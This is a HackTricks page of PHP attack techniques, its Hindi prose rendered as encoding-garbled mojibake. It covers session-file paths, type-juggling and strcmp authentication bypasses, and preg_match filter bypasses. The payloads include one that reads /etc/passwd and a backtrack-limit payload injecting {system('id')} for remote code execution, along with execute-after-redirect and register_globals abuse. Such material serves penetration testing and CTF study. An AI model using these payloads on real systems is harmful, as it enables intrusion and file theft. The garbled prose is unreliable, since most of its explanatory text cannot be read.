# PHP Tricks

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## рдХреБрдХреАрдЬрд╝ рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп рд╕реНрдерд╛рди:

рдпрд╣ phpMyAdmin рдХреБрдХреАрдЬрд╝ рдХреЗ рд▓рд┐рдП рднреА рдорд╛рдиреНрдп рд╣реИред

рдХреБрдХреАрдЬрд╝:
```
PHPSESSID
phpMyAdmin
```
рд╕реНрдерд╛рди:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP рддреБрд▓рдирд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

### рдвреАрд▓реА рддреБрд▓рдирд╛/рдЯрд╛рдЗрдк рдЬреБрдЧрд▓рд┐рдВрдЧ ( == )

рдпрджрд┐ PHP рдореЗрдВ `==` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдХреБрдЫ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдорд╛рдорд▓реЛрдВ рдореЗрдВ рддреБрд▓рдирд╛ рдЕрдкреЗрдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдирд╣реАрдВ рдХрд░рддреА рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ "==" рдХреЗрд╡рд▓ рдЙрди рдореВрд▓реНрдпреЛрдВ рдХреА рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рдорд╛рди рдкреНрд░рдХрд╛рд░ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рдпрджрд┐ рдЖрдк рдпрд╣ рднреА рддреБрд▓рдирд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рддреБрд▓рдирд╛ рдХрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдХрд╛ рдкреНрд░рдХрд╛рд░ рд╕рдорд╛рди рд╣реИ, рддреЛ рдЖрдкрдХреЛ `===` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

PHP рддреБрд▓рдирд╛ рддрд╛рд▓рд┐рдХрд╛рдПрдБ: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЬреЛ рд╕рдВрдЦреНрдпрд╛ рд╕реЗ рд╢реБрд░реВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рд╡рд╣ рд╕рдВрдЦреНрдпрд╛ рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрддреА рд╣реИ
* `"0xAAAA" == "43690" -> True` рджрд╢рдорд▓рд╡ рдпрд╛ рд╣реЗрдХреНрд╕ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╕рдВрдЦреНрдпрд╛рдУрдВ рд╕реЗ рдмрдиреА рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдЕрдиреНрдп рд╕рдВрдЦреНрдпрд╛рдУрдВ/рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдпрджрд┐ рд╕рдВрдЦреНрдпрд╛рдПрдБ рд╕рдорд╛рди рдереАрдВ (рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рд╕рдВрдЦреНрдпрд╛рдПрдБ рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛рдпрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВ)
* `"0e3264578" == 0 --> True` "0e" рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдФрд░ рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЗ рдмрд╛рдж рдЖрдиреЗ рд╡рд╛рд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ 0 рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдЧреА
* `"0X3264578" == 0X --> True` "0" рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдФрд░ рдХрд┐рд╕реА рднреА рдЕрдХреНрд╖рд░ (X рдХреЛрдИ рднреА рдЕрдХреНрд╖рд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ) рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЗ рд╕рд╛рде рдЖрдиреЗ рд╡рд╛рд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ 0 рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдЧреА
* `"0e12334" == "0" --> True` рдпрд╣ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдк "0" рдХреЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЗрдирдкреБрдЯ рдФрд░ рдХреБрдЫ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╣реИрд╢ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ рдФрд░ рдЗрд╕рдХреА рддреБрд▓рдирд╛ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ рдРрд╕рд╛ рдорд╛рди рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ "0e" рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИрд╢ рдмрдирд╛рдП рдФрд░ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЕрдХреНрд╖рд░ рдХреЗ, рддреЛ рдЖрдк рддреБрд▓рдирд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдЗрд╕ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реИрд╢ рдХреА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕** рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдХреЛрдИ рднреА рдЕрдХреНрд╖рд░ int 0 рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрддрд╛ рд╣реИ

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**рдЯрд╛рдЗрдк рдЬреБрдЧрд▓рд┐рдВрдЧ** рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `in_array()` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рднреА рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ (рдЖрдкрдХреЛ рд╕рдЦреНрдд рддреБрд▓рдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреАрд╕рд░реЗ рддрд░реНрдХ рдХреЛ рд╕рддреНрдп рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

рдпрджрд┐ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЬрд╛рдВрдЪ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛) рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рддреБрд▓рдирд╛ рдХреЗ рдПрдХ рдкрдХреНрд╖ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рдорд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдЦрд╛рд▓реА рдПрд░реЗ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ (`https://example.com/login.php/?username=admin&password[]=`) рдФрд░ рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` рдХреЗ рд╕рд╛рде рднреА рд╡рд╣реА рддреНрд░реБрдЯрд┐ рд╣реЛрддреА рд╣реИ

### рд╕рдЦреНрдд рдкреНрд░рдХрд╛рд░ рдЬреБрдЧрд▓рд┐рдВрдЧ

рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрджрд┐ `===` **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ**, рддрдм рднреА рдРрд╕реА рддреНрд░реБрдЯрд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ **рддреБрд▓рдирд╛ рдХреЛ рдкреНрд░рдХрд╛рд░ рдЬреБрдЧрд▓рд┐рдВрдЧ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рдмрдирд╛рддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рддреБрд▓рдирд╛ **рддреБрд▓рдирд╛ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рдЕрд▓рдЧ рдкреНрд░рдХрд╛рд░ рдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░ рд░рд╣реА рд╣реИ**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ** рдХреЛ **рдорд╛рдиреНрдп** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣ **рдЬрд╛рдВрдЪрддрд╛** рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ **рд╢рдмреНрдж/regex** **рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ** рд╕реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ** рдореЗрдВ **рдореМрдЬреВрдж** рд╣реИ рдФрд░ рдпрджрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рдХреЛрдб рдЕрдкрдиреА рдХрд╛рд░реНрдпрд╡рд╛рд╣реА рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддрд╛ рд╣реИ)ред

#### рдирдИ рдкрдВрдХреНрддрд┐ рдмрд╛рдпрдкрд╛рд╕

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрдм regexp`preg_match()` рдХреЗ рдкреНрд░рд╛рд░рдВрдн рдХреЛ рд╕реАрдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ **рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреА рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐** рдХреА **рдЬрд╛рдВрдЪ** рдХрд░рддрд╛ рд╣реИ, рдлрд┐рд░ рдпрджрд┐ рдХрд┐рд╕реА рддрд░рд╣ рдЖрдк **рдХрдИ рдкрдВрдХреНрддрд┐рдпреЛрдВ** рдореЗрдВ рдЗрдирдкреБрдЯ **рднреЗрдЬ** рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **рдирдП рд▓рд╛рдЗрдиреЛрдВ рдХреЗ рд╕рд╛рде рдорд╛рди рдХреЛ URL-encoded** (`%0A`) рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдпрджрд┐ рдЖрдк **JSON рдбреЗрдЯрд╛** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕реЗ **рдХрдИ рд▓рд╛рдЗрдиреЛрдВ рдореЗрдВ** рднреЗрдЬреЗрдВ:
```php
{
"cmd": "cat /etc/passwd"
}
```
Find an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Length error bypass**

(рдпрд╣ рдмрд╛рдпрдкрд╛рд╕ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ PHP 5.2.5 рдкрд░ рдЖрдЬрдорд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдореИрдВ рдЗрд╕реЗ PHP 7.3.15 рдкрд░ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рд╡рд╛ рд╕рдХрд╛)\
рдпрджрд┐ рдЖрдк `preg_match()` рдХреЛ рдПрдХ рдорд╛рдиреНрдп рдмрд╣реБрдд **рдмрдбрд╝рд╛ рдЗрдирдкреБрдЯ** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ **рдЗрд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧрд╛** рдФрд░ рдЖрдк **рдЪреЗрдХ рдХреЛ рдмрд╛рдпрдкрд╛рд╕** рдХрд░ рд╕рдХреЗрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдпрд╣ рдПрдХ JSON рдХреЛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рд╕рдорд╕реНрдпрд╛ рдЗрд╕ рдХрд╛рд░рдг рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ PHP рдореЗрдВ `preg_*` рдлрд╝рдВрдХреНрд╢рди [PCRE рд▓рд╛рдЗрдмреНрд░реЗрд░реА](http://www.pcre.org/) рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред PCRE рдореЗрдВ рдХреБрдЫ рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдмрд╣реБрдд рд╕рд╛рд░реЗ рдкреБрдирд░рд╛рд╡реГрддреНрдд рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд┐рд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдмрд╣реБрдд рдЕрдзрд┐рдХ рд╕реНрдЯреИрдХ рд╕реНрдкреЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐рдпреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рдХреА рдЧрдИ рдорд╛рддреНрд░рд╛ рдкрд░ рдПрдХ рд╕реАрдорд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рд▓реЗрдХрд┐рди PHP рдореЗрдВ рдпрд╣ рд╕реАрдорд╛ [рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) рд╣реЛрддреА рд╣реИ, рдЬреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдлрд┐рдЯ рд╣реЛрдиреЗ рд╕реЗ рдЕрдзрд┐рдХ рд╣реИред

[рдпрд╣ Stackoverflow рдереНрд░реЗрдб](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) рднреА рдЙрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд▓рд┐рдВрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬрд╣рд╛рдБ рдЗрд╕ рдореБрджреНрджреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдмрд╛рдд рдХреА рдЧрдИ рд╣реИред рд╣рдорд╛рд░рд╛ рдХрд╛рд░реНрдп рдЕрдм рд╕реНрдкрд╖реНрдЯ рдерд╛:\
**рдПрдХ рдЗрдирдкреБрдЯ рднреЗрдЬреЗрдВ рдЬреЛ regex рдХреЛ 100\_000+ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐рдпреЛрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗ, рдЬрд┐рд╕рд╕реЗ SIGSEGV рд╣реЛ, рдЬрд┐рд╕рд╕реЗ `preg_match()` рдлрд╝рдВрдХреНрд╢рди `false` рд▓реМрдЯрд╛рдП рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдпрд╣ рд╕реЛрдЪрдиреЗ рдкрд░ рдордЬрдмреВрд░ рдХрд░реЗ рдХрд┐ рд╣рдорд╛рд░рд╛ рдЗрдирдкреБрдЯ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдирд╣реАрдВ рд╣реИ, рдЕрдВрдд рдореЗрдВ рдкреИрдХреЗрдЬ рдореЗрдВ рдХреБрдЫ рдРрд╕рд╛ рдлреЗрдВрдХрддреЗ рд╣реБрдП `{system(<verybadcommand>)}` рдЬрд┐рд╕рд╕реЗ SSTI --> RCE --> рдзреНрд╡рдЬ :)**ред

рдЦреИрд░, regex рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, рд╣рдо рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ 100k "рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐рдпреЛрдВ" рдХреЛ рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдмрд▓реНрдХрд┐ рд╣рдо "рдмреИрдХрдЯреНрд░реИрдХрд┐рдВрдЧ рд╕реНрдЯреЗрдкреНрд╕" рдХреА рдЧрд┐рдирддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЬреЛ [PHP рджрд╕реНрддрд╛рд╡реЗрдЬрд╝](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) рдХреЗ рдЕрдиреБрд╕рд╛рд░ `pcre.backtrack_limit` рдЪрд░ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 1\_000\_000 (1M) рд╣реЛрддреА рд╣реИред\
рдЗрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, `'X'*500_001` 1 рдорд┐рд▓рд┐рдпрди рдмреИрдХрдЯреНрд░реИрдХрд┐рдВрдЧ рд╕реНрдЯреЗрдкреНрд╕ (500k рдЖрдЧреЗ рдФрд░ 500k рдкреАрдЫреЗ) рдХрд╛ рдкрд░рд┐рдгрд╛рдо рджреЗрдЧрд╛:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP рдСрдмрдлрд╕реНрдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдЯрд╛рдЗрдк рдЬрдЧрд▓рд┐рдВрдЧ
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

рдпрджрд┐ PHP рдХрд┐рд╕реА рдЕрдиреНрдп рдкреГрд╖реНрда рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ рд▓реЗрдХрд┐рди **`die`** рдпрд╛ **`exit`** рдлрд╝рдВрдХреНрд╢рди **рд╣реЗрдбрд░ `Location` рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**, рддреЛ PHP рдирд┐рд╖реНрдкрд╛рджрди рдЬрд╛рд░реА рд░рдЦрддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рдмреЙрдбреА рдореЗрдВ рдЬреЛрдбрд╝рддрд╛ рд╣реИ:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## рдкрде рдЯреНрд░реИрд╡рд░реНрд╕рд▓ рдФрд░ рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢ рд╢реЛрд╖рдг

Check:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## рдФрд░ рдЯреНрд░рд┐рдХреНрд╕

* **register\_globals**: In **PHP < 4.1.1.1** рдпрд╛ рдпрджрд┐ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, **register\_globals** рд╕рдХреНрд░рд┐рдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╛ рдЙрдирдХрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдЕрдиреБрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ)ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╡реИрд╢реНрд╡рд┐рдХ рдЪрд░ рдЬреИрд╕реЗ $\_GET рдпрджрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рдПрдХ рдорд╛рди рд╣реИ рдЬреИрд╕реЗ $\_GET\["param"]="1234", рдЖрдк рдЗрд╕реЗ **$param рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, HTTP рдкреИрд░рд╛рдореАрдЯрд░ рднреЗрдЬрдХрд░ рдЖрдк рдЙрди рдЪрд░ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдХреЛрдб рдХреЗ рднреАрддрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
